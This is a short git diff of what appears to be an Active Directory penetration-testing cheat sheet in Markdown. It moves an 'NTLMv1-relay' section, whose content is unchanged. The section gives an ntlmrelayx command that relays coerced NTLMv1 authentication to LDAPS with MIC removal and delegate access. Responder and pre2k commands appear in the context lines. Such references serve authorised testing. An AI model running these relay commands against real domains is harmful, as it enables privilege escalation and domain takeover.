@@ -503,6 +503,17 @@ pre2k auth -d <AD_domain> -dc-ip <Domain_Controller_IP>
 </details>
 
 <details>
+  <summary> NTLMv1-relay </summary>   
+
+  ### NTLMRelayx delegate access if NTLMv1 is enabled
+  #### Authentication can be forced via NetExec's coerce_plus Module, check if the answer is in NTLMv1
+  ```shell
+  sudo python3 ntlmrelayx.py -t ldaps://<target> --remove-mic -smb2support --delegate-access
+  ```
+
+</details>
+
+<details>
   <summary> LDAP-relay </summary>   
 
   ### Evaluate no ldap-signing and create an IP txt file for NTLMRelayx
@@ -546,17 +557,6 @@ pre2k auth -d <AD_domain> -dc-ip <Domain_Controller_IP>
   ```shell
   sudo responder -I eth0 
   ```
-</details>
-
-<details>
-  <summary> NTLMv1-relay </summary>   
-
-  ### NTLMRelayx delegate access if NTLMv1 is enabled
-  #### Authentication can be forced via NetExec's coerce_plus Module, check if the answer is in NTLMv1
-  ```shell
-  sudo python3 ntlmrelayx.py -t ldaps://<target> --remove-mic -smb2support --delegate-access
-  ```
-
 </details>
 
 <details>
